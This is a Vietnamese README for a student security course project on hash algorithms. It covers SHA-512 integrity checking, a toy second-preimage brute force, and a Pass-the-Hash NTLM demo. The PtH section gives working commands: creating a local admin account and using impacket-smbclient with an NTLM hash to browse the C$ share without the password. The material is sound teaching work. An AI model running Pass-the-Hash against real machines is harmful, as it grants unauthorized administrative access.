## 1. Cấu trúc thư mục

```text
code_demo/
├── sha512/                  # [Mục 5.2] Demo kiểm tra tính toàn vẹn Client - Server
│   ├── server.py            # Nhận dữ liệu và kiểm tra mã băm
│   ├── client.py            # Gửi text hoặc file kèm mã băm
│   ├── sample_data/         # File mẫu: text.txt, test.png, sample.mp4
│   └── received_files/      # Thư mục lưu file server nhận được
│
├── preimage/                # [Mục 5.3] Demo Tấn công tiền ảnh thứ hai (Second Preimage)
│   ├── server.py            # Server nạn nhân kiểm tra tiền tố băm (16-bit)
│   └── attack.py            # Tool brute-force tìm thông điệp giả mạo có cùng hash
│
├── pth/                     # [Mục 5.4] Minh họa Pass-the-Hash NTLM
│   ├── ntlm.py              # Hàm tính toán NTLM Hash: MD4(UTF-16LE(Password))
│   ├── pth_sim.py           # Mô phỏng Challenge-Response và PtH
│   └── kali_guide.md        # Các bước chạy thử bằng Kali Linux
│
├── web/                     # Giao diện web cho các demo
│   ├── app.py               # Backend Flask
│   └── templates/index.html # Giao diện web cho các demo
│
├── run.bat                  # Menu điều khiển chạy tất cả các demo
└── README.md                # Tài liệu hướng dẫn & Kịch bản thuyết trình
```

---

## 2. Cách chạy

Chạy file **`run.bat`** để mở menu. Các lựa chọn trong menu gồm:
```text
=====================================================================
          BÀI TẬP LỚN CƠ SỞ AN TOÀN THÔNG TIN - NHÓM 05
              Đề tài: Nghiên cứu các giải thuật băm
=====================================================================

  [1] Chạy Server SHA-512       (Kiểm tra tính toàn vẹn)
  [2] Chạy Client SHA-512       (Gửi text, file, ảnh, video)
  -------------------------------------------------------------------
  [3] Chạy Server nạn nhân      (Mục 5.3: Second Preimage)
  [4] Chạy Tool tấn công        (Brute-force tìm va chạm tiền tố)
  -------------------------------------------------------------------
  [5] Mô phỏng Pass-the-Hash    (Chạy giả lập NTLM Auth bằng Python)
  [6] Mở Web Dashboard          (Giao diện trực quan trực tiếp)
  [7] Mở Kali Linux (WSL2)      (Thực chiến Impacket Pass-the-Hash)
  -------------------------------------------------------------------
  [0] Thoát
=====================================================================
```

Hoặc chạy trực tiếp từng module qua lệnh:
```bash
# Demo 1: Toàn vẹn dữ liệu
python sha512/server.py
python sha512/client.py

# Demo 2: Tấn công tiền ảnh thứ 2
python preimage/server.py
python preimage/attack.py

# Demo 3: Pass-the-Hash NTLM
python pth/pth_sim.py

# Demo 4: Web Dashboard
python web/app.py
```

---

## 3. Các bước demo

### PHẦN 1: MỤC 5.2 - KIỂM TRA TÍNH TOÀN VẸN (SHA-512 + SECRET KEY)

#### Trường hợp 1: Dữ liệu toàn vẹn
1. **Thao tác**:
   - Mở `run.bat`, chọn `1` (Chạy Server). Server in: `Server sẵn sàng!`.
   - Mở `run.bat`, chọn `2` (Chạy Client).
   - Chọn `1` $\rightarrow$ Nhập `Hello, I am client!`.
2. **Kết quả**: Client và Server dùng chung Secret Key `G08L04DEMOSHA`. Server tính lại mã SHA-512 từ dữ liệu nhận được và so sánh với mã Client gửi. Nếu giống nhau, Server báo `OK - Dữ liệu toàn vẹn!`.
3. **Thử nghiệm gửi file**: Chọn `2` (File text), `3` (Hình ảnh), `4` (Video) để gửi file mẫu. Server nhận và lưu file vào `sha512/received_files/`.

#### Trường hợp 2: Dữ liệu bị thay đổi / Sai khóa
1. **Thao tác**: Sửa biến `key` trong [sha512/client.py](sha512/client.py) thành `"G08L04DEMOSHA512"`. Chạy lại Client gửi tin.
2. **Kết quả**: Hai giá trị hash lệch nhau hoàn toàn $\rightarrow$ Server từ chối và báo `LỖI - Dữ liệu bị thay đổi!`.
3. **Giải thích**: Chỉ cần đổi một ký tự hoặc dùng sai khóa thì mã băm thay đổi rất nhiều do hiệu ứng Tuyết lở. Vì vậy Server phát hiện được dữ liệu không hợp lệ.

---

### PHẦN 2: MỤC 5.3 - TẤN CÔNG TIỀN ẢNH THỨ HAI (SECOND PREIMAGE ATTACK)

1. **Ý tưởng**:
   - Cho trước thông điệp thật $m_1$, tìm thông điệp giả $m_2 \neq m_1$ sao cho $H(m_2) = H(m_1)$.
   - Để demo trực tiếp trong vài giây, chương trình cài đặt so sánh **16-bit đầu tiên (4 ký tự hex đầu)** ($2^{16} = 65,536$ khả năng).
2. **Thao tác**:
   - Chạy Server: chọn `3` trong `run.bat` ([preimage/server.py](preimage/server.py)).
   - Chạy Attack: chọn `4` trong `run.bat` ([preimage/attack.py](preimage/attack.py)).
   - Nhập chuỗi thật: `Hello, I am client!`.
3. **Kết quả**:
   - Tool tìm ra thông điệp giả (ví dụ `KuXJV018`) có 4 ký tự đầu của hash trùng với hash của thông điệp thật trong vòng ~0.2 giây.
   - Gửi dữ liệu giả mạo kèm hash thật lên Server $\rightarrow$ Server chỉ kiểm tra tiền tố nên bị đánh lừa: **`OK - Dữ liệu toàn vẹn!`**.

---

### PHẦN 3: MỤC 5.4 - MINH HỌA PASS-THE-HASH (PtH) NTLM

Nhóm chuẩn bị 2 phương án demo linh hoạt:

#### Phương án A: Chạy thử bằng Kali Linux (WSL2) và Windows
1. **Bước 1 (Windows Host)**: Mở PowerShell (Admin) tạo user mục tiêu & lấy IP Wi-Fi:
   ```cmd
   net user victim 12345678 /add
   net localgroup administrators victim /add
   ipconfig
   ```
2. **Bước 2 (Kali Linux Terminal)**: Chọn `7` trong `run.bat` $\rightarrow$ gõ lệnh tấn công bằng NTLM hash `259745cb123a52aa2e693aaacca2db52` (tương ứng mật khẩu `12345678`):
   ```bash
   impacket-smbclient -hashes :259745cb123a52aa2e693aaacca2db52 victim@<IP_WIFI_WINDOWS>
   ```
3. **Bước 3 (Thao tác trên Shell Kali)**:
   ```text
   # shares        (Liệt kê các ổ đĩa quản trị đặc quyền: ADMIN$, C$, D$)
   # use C$        (Truy cập thẳng ổ đĩa C của máy Windows)
   # ls            (Duyệt file hệ thống của Windows mà KHÔNG cần biết mật khẩu!)
   # exit
   ```
4. **Bước 4 (Dọn dẹp sau khi demo)**: Trên PowerShell Windows: `net user victim /delete`.

#### Phương án B: Mô phỏng bằng Python hoặc giao diện web
- Chọn `5` trong `run.bat` ([pth/pth_sim.py](pth/pth_sim.py)):
  - Xem mô phỏng quá trình Server gửi Challenge và Client/Attacker ký HMAC bằng NTLM Hash.
  - Phân tích toán học vì sao NTLM Hash $MD4(UTF\text{-}16LE(Password))$ bị dùng để đăng nhập mà không cần password gốc.
- Chi tiết hướng dẫn xem thêm tại [pth/kali_guide.md](pth/kali_guide.md).

---

### PHẦN 4: MỤC 5.5 - WEB DASHBOARD TRỰC QUAN

- **Thao tác**: Chọn `6` trong `run.bat` $\rightarrow$ Tự động mở trình duyệt `http://127.0.0.1:5000`.
- **Nội dung trình diễn**:
  1. *Tính toàn vẹn*: Thử đổi ký tự để xem cảnh báo trực quan.
  2. *Hiệu ứng Tuyết lở (Avalanche)*: So sánh `PTIT 2026` vs `PTIT 2027`, xem tỉ lệ bit đổi (~51%).
  3. *Tấn công tiền ảnh*: Chạy vét cạn đồ họa thời gian thực.
  4. *NTLM Hasher*: Chuyển đổi chuỗi sang NTLM hash.